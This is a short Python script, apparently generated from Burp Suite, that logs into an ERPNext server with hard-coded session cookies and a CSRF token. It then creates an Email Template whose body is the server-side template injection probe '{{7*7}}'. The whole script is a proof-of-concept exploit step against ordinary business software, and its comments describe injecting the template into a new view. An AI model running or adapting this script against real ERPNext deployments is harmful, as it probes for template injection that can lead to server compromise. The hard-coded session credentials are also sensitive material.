import requests
# obviously this needs to be run after logging in.
# also we want to inject the template name into the new view.
session = requests.session()

burp0_url = "http://erpnext:8000/api/method/frappe.desk.form.save.savedocs"
burp0_cookies = {"user_id": "zeljka.k%40randomdomain.com", "user_image": "", "full_name": "Zeljka%20Kola%C5%A1inac", "sid": "a3da8ddc0ef4b82dbc41cdcfa842fe5dde6f7306c2523418dac0ce9d", "system_user": "yes"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Frappe-CSRF-Token": "1cfc1b545ac656614e8d94d397c80a8543038d3fdd76d39bbca2bfd3", "X-Frappe-CMD": "", "X-Requested-With": "XMLHttpRequest", "Origin": "http://erpnext:8000", "Connection": "close", "Referer": "http://erpnext:8000/desk"}
burp0_data = {"doc": "{\"docstatus\":0,\"doctype\":\"Email Template\",\"name\":\"New Email Template 2\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"zeljka.k@randomdomain.com\",\"__newname\":\"ssti_t7\",\"subject\":\"ssti_t6\",\"response\":\"<div>{{7*7}}</div>\"}", "action": "Save"}
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)